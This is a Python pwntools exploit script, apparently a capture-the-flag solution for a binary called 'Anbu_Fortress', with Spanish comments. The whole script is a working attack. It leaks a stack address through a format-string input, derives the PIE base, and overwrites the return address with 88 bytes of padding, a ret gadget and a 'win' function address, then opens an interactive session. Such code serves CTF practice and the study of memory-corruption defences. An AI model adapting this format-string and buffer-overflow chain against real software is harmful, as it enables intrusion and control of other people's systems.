from pwn import *
import re

binary = "./Anbu_Fortress"
padding = 88
main_offset = 0x1752
ret = 0x0000000000001016
#p = remote("challs.caliphalhounds.com",21389) 
p=process(binary)

main = 0x555555555752
win = 0x555555555209
offset = win - main
print(f"Este es el offset {hex(offset)}")

p.sendlineafter(b"Introduzca su identificador: ", b"%57$p")
output  = p.recvuntil(b"ero", timeout=2).decode(errors="ignore")
output += p.recvline(timeout=2).decode(errors="ignore")
print(f"[DEBUG] Output recibido:\n{output}")
pie_base = 0
m = re.search(r"0x[0-9a-fA-F]+", output)

if m:
    leak = int(m.group(0), 16)
    print(f"[+] Leak guardado: {hex(leak)}")

    pie_base = leak - main_offset
    print(f"[+] Base del PIE: {hex(pie_base)}")

    win_addr = leak + offset
    print(f"[+] Dirección win: {hex(win_addr)}")
else:
    print("[-] No se encontró leak")
    win_addr = 0

new_ret = pie_base + ret
print(f"Este es el nuevo ret_ {hex(new_ret)}")

payload = b"A" * padding + p64(new_ret) +  p64(win_addr)
p.sendline(payload)

p.interactive()
